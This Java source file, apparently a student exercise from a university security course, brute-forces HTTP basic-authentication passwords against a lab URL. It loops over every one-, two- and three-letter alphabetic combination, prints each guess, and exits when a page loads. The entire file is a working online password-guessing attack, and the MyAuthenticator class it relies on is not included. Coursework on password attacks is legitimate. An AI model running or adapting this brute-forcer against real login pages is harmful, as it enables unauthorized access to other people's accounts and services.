


import java.text.*;  
import java.util.*;  
import java.net.*;  
import java.io.*;  

  
public class BruteForce {  

   public int runProcess(String urlString,String passwd) {  

       int returnval = 0;
       MyAuthenticator auth = new MyAuthenticator(passwd);
       Authenticator.setDefault(auth);

	       System.out.println("trying passord: " + passwd);
       try{
            URL yahoo = new URL(urlString); 
            BufferedReader in = new BufferedReader(new InputStreamReader(yahoo.openStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
	       System.out.println(inputLine);
	       System.out.println("passord: " + passwd);
               returnval = 1;
            }
	    in.close();
          }catch(Exception e){ returnval = 0;}
       return returnval;
   }

   public static void  main(String argv[]) {  

       String[] val = 
{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};

      int l1 = 0;

      int l2 = 0;

      int l3 = 0;
      
      int retval = 0;

      String pwd = "";

      
      BruteForce s = new BruteForce();  
      String urlToSearch = "http://sec-crack.cs.rmit.edu./SEC/2/";  
    
      for (int a = 0; a < 52; a++) {

        l1 = a;

        pwd = val[l1];
        retval = 0;
        retval = s.runProcess(urlToSearch,pwd);  
        if (retval > 0) {
           System.exit(0);
        }
      }


      for (int b = 0; b < 52; b++) {
        l1 = b;
        for (int c = 0; c < 52; c++) {

          l2 = c;
          pwd = val[l1]+ val[l2];
          retval = 0;
          retval = s.runProcess(urlToSearch,pwd);  
          if (retval > 0) {
             System.exit(0);
          }
        }
      }


      for (int d = 0; d < 52; d++) {
        l1 = d;
        for (int e = 0; e < 52; e++) {
          l2 = e;
          for (int f = 0; f < 52; f++) {

              l3 = f;

              pwd = val[l1]+ val[l2]+ val[l3];
              retval = 0;
              retval = s.runProcess(urlToSearch,pwd);  
              if (retval > 0) {
                 System.exit(0);
              }
           }
        }
      }

    }  
}     

